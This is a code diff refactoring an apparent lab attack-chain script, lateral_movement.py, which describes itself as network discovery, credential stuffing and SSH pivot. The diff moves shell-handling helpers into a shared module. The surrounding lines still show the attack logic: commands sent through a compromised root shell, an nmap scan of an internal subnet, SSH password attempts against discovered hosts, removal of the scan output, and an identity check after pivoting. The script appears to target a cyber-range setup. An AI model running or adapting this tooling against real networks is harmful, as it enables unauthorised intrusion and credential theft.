@@ -4,7 +4,7 @@ import socket
 import threading
 import time
 
-from chainlog import log
+from chainlog import drain, log, run_remote, send_command
 
 # =============================================================================
 # lateral_movement.py — Network Discovery + Credential Stuffing + SSH Pivot
@@ -52,85 +52,6 @@ _SKIP_HOSTS = {"10.30.0.1", "10.30.0.2", "10.30.0.3", "10.30.0.4", "10.30.0.6"}
 _FALLBACK_SPRAY_TARGETS = ["10.30.0.7", "10.30.0.8"]
 
 
-def send_command(shell, command):
-    """Send a command through an active shell connection."""
-    shell.sendall((command + "\n").encode())
-    time.sleep(0.5)
-
-
-_sentinel_seq = 0
-
-
-def _drain(shell):
-    """Discard stale bytes left in the socket buffer from a previous command."""
-    prev = shell.gettimeout()
-    shell.settimeout(0.1)
-    while True:
-        try:
-            if not shell.recv(4096):
-                break
-        except socket.timeout:
-            break
-    shell.settimeout(prev)
-
-
-def _run_remote(shell, cmd, timeout=10):
-    """
-    Send cmd to shell, collect output, return it.
-
-    Drains stale socket data first, then sends the command and a uniquely-
-    numbered sentinel as two separate lines.  Bash echoes the sentinel line
-    AFTER the command output, so buf[:sentinel_pos] captures the real output.
-    """
-    global _sentinel_seq
-    _sentinel_seq += 1
-    sentinel = f"SENTINEL_{_sentinel_seq:04X}_END"
-
-    _drain(shell)
-    shell.sendall(f"{cmd}\n".encode())
-    time.sleep(0.5)
-    shell.sendall(f"echo {sentinel}\n".encode())
-
-    prev_timeout = shell.gettimeout()
-    shell.settimeout(2)
-    buf = ""
-    deadline = time.time() + timeout
-    while time.time() < deadline:
-        try:
-            buf += shell.recv(4096).decode(errors="replace")
-        except socket.timeout:
-            pass
-        if sentinel in buf:
-            break
-    shell.settimeout(prev_timeout)
-
-    # Everything before the sentinel echo is the real command output.
-    if sentinel in buf:
-        buf = buf[:buf.index(sentinel)]
-
-    buf = re.sub(r"\x1b\[[0-9;]*[A-Za-z]", "", buf)
-    buf = buf.replace("\r", "")
-    return buf.strip()
-
-
-def _read_id(shell, timeout=10):
-    """Send 'id' and return the response string."""
-    send_command(shell, "id")
-    prev = shell.gettimeout()
-    shell.settimeout(5)
-    response = ""
-    deadline = time.time() + timeout
-    while time.time() < deadline:
-        try:
-            chunk = shell.recv(1024).decode(errors="replace")
-            if chunk:
-                response += chunk
-                if "uid=" in response:
-                    break
-        except socket.timeout:
-            break
-    shell.settimeout(prev)
-    return response
 
 
 def _parse_gnmap_hosts(gnmap_text):
@@ -161,7 +82,7 @@ def _try_password(root_shell, ip, user, pwd, port):
         f"-p {port} "
         f"{user}@{ip} id 2>&1"
     )
-    out = _run_remote(root_shell, cmd, timeout=12)
+    out = run_remote(root_shell, cmd, timeout=12)
     return ("uid=" in out and user in out), out
 
 
@@ -249,8 +170,8 @@ def run(root_shell, kali_host=KALI_HOST, workstation_ip=WORKSTATION_IP,
         f"-oG {SCAN_OUTPUT_FILE} {INTERNAL_SUBNET} >/dev/null && "
         f"cat {SCAN_OUTPUT_FILE}"
     )
-    scan_out = _run_remote(root_shell, scan_cmd, timeout=60)
-    _run_remote(root_shell, f"rm -f {SCAN_OUTPUT_FILE}")
+    scan_out = run_remote(root_shell, scan_cmd, timeout=60)
+    run_remote(root_shell, f"rm -f {SCAN_OUTPUT_FILE}")
 
     discovered = [ip for ip in _parse_gnmap_hosts(scan_out) if ip not in _SKIP_HOSTS]
     if not discovered:
@@ -317,7 +238,8 @@ def run(root_shell, kali_host=KALI_HOST, workstation_ip=WORKSTATION_IP,
     # Phase 4 — Confirm identity
     # ------------------------------------------------------------------
     time.sleep(1)
-    response = _read_id(john_shell)
+    drain(john_shell, timeout=2.0)  # flush shell banner before first sentinel-based command
+    response = run_remote(john_shell, "id", timeout=10)
 
     if workstation_user in response:
         log("[+] Lateral movement successful!")
